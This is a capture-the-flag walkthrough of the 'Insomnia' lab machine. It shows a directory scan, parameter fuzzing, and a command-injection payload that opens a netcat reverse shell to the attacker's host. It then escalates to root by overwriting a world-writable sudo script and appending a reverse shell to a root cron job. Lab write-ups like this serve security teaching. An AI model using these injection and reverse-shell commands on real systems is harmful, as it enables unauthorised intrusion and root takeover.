
# Insomnia - Walkthrough by Alienum
## Directory Scan
```console
dirb http://10.0.2.114:8080/ -X .php,.txt                                                             

+ http://10.0.2.114:8080/administration.php (CODE:200|SIZE:65)                                                   
+ http://10.0.2.114:8080/chat.txt (CODE:200|SIZE:1)                                                              
+ http://10.0.2.114:8080/index.php (CODE:200|SIZE:2899)                                                          
+ http://10.0.2.114:8080/process.php (CODE:200|SIZE:2)  
```

## Find GET parameter
```console
wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt --hh 65 'http://10.0.2.114:8080/administration.php?FUZZ=test'                                                               
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                            
=====================================================================

000000485:   200        2 L      12 W       69 Ch       "logfile"    
```
## Reverse shell
```console
http://10.0.2.114:8080/administration.php?logfile=chat.txt;nc -e /bin/sh 10.0.2.15 4444
```
### My machine
```console
nc -lvp 4444
www-data@insomnia:~$ cd /home/julia
www-data@insomnia:~$ cat user.txt
```
## SLOW WAY TO ROOT (www-data -> julia -> root)
```console
www-data@insomnia:~/julia$ sudo -l
(julia) NOPASSWD: /bin/bash /var/www/html/start.sh

www-data@insomnia:~$ cd /var/www/html

www-data@insomnia:/var/www/html$ ls -la | grep start.sh
-rwxrwxrwx 1 root     root       20 Dec 21 04:18 start.sh

www-data@insomnia:/var/www/html$ cat start.sh
cat start.sh
php -S 0.0.0.0:8080
```
## Edit start.sh
```console
www-data@insomnia:/var/www/html$ cat start.sh
cat start.sh
php -S 0.0.0.0:8080

www-data@insomnia:/var/www/html$ echo "/bin/bash" > start.sh

www-data@insomnia:/var/www/html$ sudo -u julia /bin/bash /var/www/html/start.sh

julia@insomnia:/var/www/html$ id
id
uid=1000(julia) gid=1000(julia) groups=1000(julia)
```

## cat /etc/crontab
```console
julia@insomnia:~$ cat /etc/crontab
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/bash /var/cron/check.sh

julia@insomnia:~$ cd /var/cron
cd /var/cron
julia@insomnia:/var/cron$ ls -la | grep check.sh
ls -la | grep check.sh
-rwxrwxrwx  1 root root  153 Dec 21 04:17 check.sh
```
## Target machine, check.sh is writable, edit check.sh
```console
julia@insomnia:/var/cron$ echo "nc -e /bin/sh 10.0.2.15 5555" >> check.sh
```
## My machine, wait a little bit
```console
┌──(alienum㉿kali)-[~]
└─$ nc -lvp 5555
listening on [any] 5555 ...
connect to [10.0.2.15] from 10.0.2.114 [10.0.2.114] 40348
id
uid=0(root) gid=0(root) groups=0(root)
```

## Fast way to root (www-data -> root)
the www-data also can write the /var/cron/check.sh
so we are able to priv esc from www-data to root with the same way as julia
